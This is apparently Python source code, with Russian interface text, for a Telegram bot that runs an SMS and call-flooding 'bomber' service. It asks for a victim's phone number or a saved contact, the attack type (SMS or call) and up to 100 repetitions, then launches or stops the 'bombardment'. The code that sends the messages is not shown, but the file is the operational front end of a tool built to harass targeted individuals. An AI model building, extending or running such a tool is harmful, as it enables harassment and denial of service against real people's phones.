@router.callback_query(F.data == "bomb_manual")
async def bomb_manual(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("Введите номер телефона жертвы без знака [+]:")
    await state.set_state(BomberState.waiting_number)
    await callback.answer()

@router.callback_query(F.data == "bomb_choose_contact")
async def bomb_choose_contact(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    contacts = get_user_contacts(user_id)
    if not contacts:
        await callback.answer("У вас нет сохранённых контактов.", show_alert=True)
        return
    buttons = []
    for idx, contact in enumerate(contacts):
        text = f"{contact.get('phone', '')} — {contact.get('contact_name', '')}"
        buttons.append([InlineKeyboardButton(text=text, callback_data=f"bomb_contact_{idx}")])
    kb_contacts = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.edit_text("Выберите контакт для атаки:", reply_markup=kb_contacts)
    await callback.answer()

@router.callback_query(F.data.startswith("bomb_contact_"))
async def choose_bomb_contact(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    try:
        idx = int(callback.data.split("_")[-1])
    except ValueError:
        await callback.answer("Ошибка выбора контакта.")
        return
    contacts = get_user_contacts(user_id)
    if idx >= len(contacts):
        await callback.answer("Контакт не найден.")
        return
    chosen_contact = contacts[idx]
    await state.update_data(number=chosen_contact.get("phone"))
    print(f"📩 Получен номер из контактов: {chosen_contact.get("phone")} | Название контакта: {chosen_contact.get("contact_name")} | Пользователь: @{callback.from_user.username} | ID: {callback.from_user.id} ")
    await callback.message.edit_text("Выберите тип атаки:", reply_markup=kb.attack_type)
    await state.set_state(BomberState.waiting_attack_type)
    await callback.answer()

@router.message(BomberState.waiting_number)
async def process_number(message: Message, state: FSMContext):
    print(f"📩 Получен номер: {message.text} от {message.from_user.id}")
    try:
        if is_user_allowed(message.from_user.id):
            if message.text.isdigit() and message.text != '998903706877':
                await state.update_data(number=message.text)
                print(f"✅ Номер {message.text} сохранён в FSM")
                await message.answer("Выберите тип атаки:", reply_markup=kb.attack_type)
                await state.set_state(BomberState.waiting_attack_type)
                print("✅ Переход в состояние: waiting_attack_type")
            else:
                await message.answer("🔒 Введите корректный номер, состоящий только из цифр.")
                print("❌ Ошибка: введён некорректный номер")
        else:
            user_id = message.from_user.id
            username = message.from_user.username
            chat_id = message.chat.id if message.chat else user_id
            await notify_admin_about_request(message.bot, user_id, username)
            await message.answer("💔 Простите, но вы не являетесь представителем бета-тестирования нашего приложения. Ожидайте релиза.\n\n⏳ Ваш запрос отправлен на рассмотрение администраторам.")
            print(f"🚫 Доступ запрещён: Пользователь: @{username} | ID: {user_id}")
    except Exception as e:
        print(f"❌ Ошибка в process_number: {e}")


@router.callback_query(BomberState.waiting_attack_type)
async def process_attack_type(callback: CallbackQuery, state: FSMContext):
    """Выбор типа атаки (SMS, CALL и т. д.)."""
    print(f"📩 Выбран тип атаки: {callback.data} от {callback.from_user.id}")  # Лог для проверки
    
    try:
        await state.update_data(attack_type=callback.data)  # Сохраняем данные в FSM
        print(f"✅ Тип атаки сохранён в FSM: {callback.data}")  # Лог

        await callback.message.edit_text("Введите количество повторений (до 100):")
        await state.set_state(BomberState.waiting_replay)  # Переход к следующему состоянию
        print("✅ Переход в состояние: waiting_replay")  # Лог

    except Exception as e:
        print(f"❌ Ошибка в process_attack_type: {e}")  # Лог ошибки



@router.message(BomberState.waiting_replay)
async def process_replay(message: Message, state: FSMContext):
    """Получение числа повторений атаки."""
    if message.text.isdigit():
        replay = int(message.text)
        if 1 <= replay <= 100:  # Ограничиваем число повторов
            await state.update_data(replay=replay)

            await message.answer(f"Бомбардировка начнётся с {replay} повторениями.\nЗапустить?", reply_markup=kb.start_stop_bomber)
            await state.set_state(BomberState.bombing)
        else:
            await message.answer("Введите число от 1 до 100.")
    else:
        await message.answer("Введите корректное число повторений.")


@router.callback_query(F.data == "start_attack", BomberState.bombing)
async def start_attack(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик запуска атаки.
    Извлекает параметры, сбрасывает счётчик, устанавливает флаг ручной остановки в False,
    отправляет сообщение о запуске атаки и запускает start_async_attacks.
    После завершения, если атака не была остановлена вручную, отправляется финальное сообщение.
    """
    data = await state.get_data()
    number = data.get("number")
    attack_type = data.get("attack_type")
    replay = data.get("replay")

    if not all([number, attack_type, replay]):
        await callback.message.answer("❌ Ошибка! Данные для атаки отсутствуют.")
        return

    user_id = callback.from_user.id
    username = callback.from_user.username or "Нет username"

    # Сбрасываем счётчик и устанавливаем флаг ручной остановки
    await state.update_data(success_count=0)
    manual_stop_flags[user_id] = False

    # Отправляем сообщение о запуске атаки в одну строку
    await callback.message.edit_text(
        f"🚀 Бомбардировка запущена!\n\n👤 Пользователь: @{username} (ID: {user_id})\n📞 Номер: {number}\n⚙️ Тип: {attack_type}\n🔁 Повторы: {replay}\n❗ Чтобы остановить, нажмите кнопку ниже.", reply_markup=kb.stop_bomber)

    await start_async_attacks(user_id, username, number, attack_type, replay, state)

    if manual_stop_flags.get(user_id, False):
        manual_stop_flags.pop(user_id, None)
        await state.clear()
        return

    final_data = await state.get_data()
    success_count = final_data.get("success_count", 0)
    await callback.message.answer(
        f"❤ Бомбардировка окончена! 💌 Успешных сообщений: {success_count}",
        reply_markup=kb.main
    )
    await state.clear()

@router.callback_query(F.data == "stop_attack", BomberState.bombing)
async def stop_attack(callback: CallbackQuery, state: FSMContext):
    """
    Обработчик остановки атаки.
    Вызывает stop_attacks, устанавливает флаг ручной остановки и отправляет сообщение.
    """
    user_id = callback.from_user.id
    await stop_attacks(user_id)
    manual_stop_flags[user_id] = True
    await callback.message.edit_text(f"🛑 Бомбардировка остановлена", reply_markup=kb.main)
    # Не очищаем state сразу, чтобы start_attack смог проверить флаг